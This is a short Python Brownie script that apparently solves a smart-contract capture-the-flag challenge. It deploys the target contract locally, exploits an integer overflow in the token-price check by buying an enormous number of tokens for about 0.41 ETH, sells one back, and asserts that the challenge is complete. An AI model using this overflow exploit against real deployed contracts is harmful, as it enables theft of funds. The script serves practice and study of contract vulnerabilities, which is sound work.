#!/usr/bin/python3
# from brownie import Attack
from colorama import Fore
from scripts.deploy import deploy
from scripts.helpful_scripts import get_account

# * colours
green = Fore.GREEN
red = Fore.RED
blue = Fore.BLUE
magenta = Fore.MAGENTA
reset = Fore.RESET


def print_colour(solved):
    if solved:
        print(f"{blue}Is complete: {green}{True}{reset}")
    else:
        print(f"{blue}Is complete: {red}{solved}{reset}")


def hack(contract_address=None, attacker=None):
    if not contract_address:
        target, _ = deploy()
        _, attacker = get_account()
    else:
        print(f"{red}Something is wrong{reset}")
        exit(-1)

    print_colour(target.isComplete())

    # msg.value == numTokens * PRICE_PER_TOKEN
    # 2^256 / 10^18 + 1 = 115792089237316195423570985008687907853269984665640564039458
    # (2^256 / 10^18 + 1) * 10^18 - 2^256 = 415992086870360064 ~= 0.41 ETH

    target.buy(
        115792089237316195423570985008687907853269984665640564039458,
        {"from": attacker, "value": 415992086870360064},
    ).wait(1)

    target.sell(1, {"from": attacker}).wait(1)

    print_colour(target.isComplete())

    assert target.isComplete() == True


def main(contract_address=None):
    if contract_address:
        hack(contract_address, get_account())
    else:
        hack()


if __name__ == "__main__":
    main()
